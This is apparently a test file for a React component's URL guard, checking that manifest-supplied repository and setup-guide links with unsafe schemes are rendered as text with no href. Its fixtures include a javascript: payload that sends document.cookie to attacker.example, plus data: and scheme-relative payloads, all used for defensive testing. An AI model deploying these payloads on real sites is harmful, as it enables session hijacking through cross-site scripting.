// SPDX-License-Identifier: Apache-2.0

/**
 * Call-site coverage for the manifest-URL guard.
 *
 * Both blocks render publisher-authored AFPS manifest data. The server accepts
 * `repository` as a non-empty string, while the canonical AFPS schema validates
 * the `setup_guide` structure but leaves each optional URL as an unconstrained
 * string. Neither path constrains the scheme, so the navigation guard remains
 * the trust boundary before an `href`.
 *
 * Same harness as `components/test/plan-card.test.tsx`: no DOM, so components
 * are rendered with `renderToStaticMarkup` and asserted on their HTML.
 */

import { describe, it, expect } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { I18nextProvider } from "react-i18next";
import type { IntegrationManifestView } from "@appstrate/shared-types";
import i18n, { i18nReady } from "../../../i18n.ts";
import { MetadataBlock, SetupGuideSteps } from "../integration-metadata.tsx";

await i18nReady;
await i18n.changeLanguage("fr");

const XSS = "javascript:fetch('https://attacker.example/'+document.cookie)";

function manifestWith(repository: unknown): IntegrationManifestView {
  return {
    name: "acme",
    display_name: "Acme",
    version: "1.0.0",
    repository,
  } as unknown as IntegrationManifestView;
}

function renderMetadata(repository: unknown): string {
  return renderToStaticMarkup(
    <I18nextProvider i18n={i18n}>
      <MetadataBlock manifest={manifestWith(repository)} />
    </I18nextProvider>,
  );
}

function renderSteps(steps: ReadonlyArray<{ label: string; url?: string }>): string {
  return renderToStaticMarkup(
    <I18nextProvider i18n={i18n}>
      <SetupGuideSteps steps={steps} />
    </I18nextProvider>,
  );
}

describe("MetadataBlock repository link", () => {
  it("links a legitimate https repository", () => {
    const html = renderMetadata("https://github.com/appstrate/appstrate");
    expect(html).toContain('href="https://github.com/appstrate/appstrate"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("links a legitimate repository object", () => {
    const html = renderMetadata({ type: "git", url: "https://github.com/appstrate/appstrate" });
    expect(html).toContain('href="https://github.com/appstrate/appstrate"');
  });

  it("renders a javascript: repository as text with no href", () => {
    const html = renderMetadata(XSS);
    expect(html).not.toContain("href");
    expect(html).not.toContain("<a ");
    // The value stays readable — auditing a package means seeing what the
    // publisher actually wrote, not a blank row.
    expect(html).toContain("document.cookie");
  });

  it("renders a javascript: repository object as text with no href", () => {
    const html = renderMetadata({ type: "git", url: XSS });
    expect(html).not.toContain("href");
    expect(html).toContain("document.cookie");
  });

  it("rejects an obfuscated javascript: scheme", () => {
    const html = renderMetadata("JaVaScRiPt:alert(1)");
    expect(html).not.toContain("href");
  });

  it("rejects a data: repository", () => {
    const html = renderMetadata("data:text/html,<script>alert(1)</script>");
    expect(html).not.toContain("href");
  });

  it("rejects a scheme-relative repository", () => {
    const html = renderMetadata("//evil.example/repo");
    expect(html).not.toContain("href");
    expect(html).toContain("//evil.example/repo");
  });

  it("shows the em dash when no repository is declared", () => {
    const html = renderMetadata(undefined);
    expect(html).not.toContain("href");
    expect(html).toContain("—");
  });
});

describe("SetupGuideSteps step link", () => {
  it("links a legitimate https step url", () => {
    const html = renderSteps([{ label: "Créer une app OAuth", url: "https://console.acme.test" }]);
    expect(html).toContain('href="https://console.acme.test/"');
    expect(html).toContain("Créer une app OAuth");
  });

  it("renders a javascript: step url as plain text", () => {
    const html = renderSteps([{ label: "Créer une app OAuth", url: XSS }]);
    expect(html).not.toContain("href");
    expect(html).not.toContain("<a ");
    // The step instruction itself is never lost.
    expect(html).toContain("Créer une app OAuth");
  });

  it("renders a scheme-relative step url as plain text", () => {
    const html = renderSteps([{ label: "Étape", url: "//evil.example/steal" }]);
    expect(html).not.toContain("href");
    expect(html).toContain("Étape");
  });

  it("keeps the existing no-url rendering", () => {
    const html = renderSteps([{ label: "Étape sans lien" }]);
    expect(html).not.toContain("href");
    expect(html).toContain("Étape sans lien");
  });

  it("guards each step independently", () => {
    const html = renderSteps([
      { label: "Sûr", url: "https://ok.example/" },
      { label: "Hostile", url: XSS },
    ]);
    expect(html).toContain('href="https://ok.example/"');
    expect(html).not.toContain("javascript:");
  });
});
